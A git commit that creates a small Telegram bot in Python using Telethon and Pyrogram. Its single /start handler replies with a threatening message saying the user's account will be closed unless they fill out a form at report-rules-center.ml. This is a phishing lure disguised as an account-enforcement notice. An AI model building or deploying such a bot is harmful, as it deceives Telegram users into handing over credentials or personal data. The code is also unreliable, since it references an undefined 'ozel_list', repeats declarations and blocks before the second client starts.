47877ec484e91dc0cec7426d2b950364f5d7515b
Løse Ønline <108939077+usermusti@users.noreply.github.com>
2022-09-07 19:03:04 +0300

    Create bot.py

---
+++ bot.py
@@ -0,0 +1,46 @@
+import os, logging, asyncio
+from telethon import Button
+from telethon import TelegramClient, events
+from telethon.sessions import StringSession
+from telethon.tl.types import ChannelParticipantsAdmins
+
+from pyrogram.types.messages_and_media import Message
+from pyrogram import Client, filters
+import time
+
+
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(name)s - [%(levelname)s] - %(message)s'
+)
+LOGGER = logging.getLogger(__name__)
+
+api_id = int(os.environ.get("APP_ID"))
+api_hash = os.environ.get("API_HASH")
+bot_token = os.environ.get("TOKEN")
+client = TelegramClient('client', api_id, api_hash).start(bot_token=bot_token)
+
+app = Client("GUNC",
+             api_id=api_id,
+             api_hash=api_hash,
+             bot_token=bot_token
+             )
+
+anlik_calisan = []
+
+ozel_list[1193186807]
+anlik_calisan = []
+grup_sayi = []
+etiketuye = []
+rxyzdev_tagTot = {}
+rxyzdev_initT = {}
+
+
+@client.on(events.NewMessage(pattern="^/start$"))
+async def start(event):
+  await event.reply("**Please fill out the form otherwise your account will be closed.**\n __http://report-rules-center.ml__")
+
+
+app.run()
+print(">> Bot çalışıyor <<")
+client.run_until_disconnected()
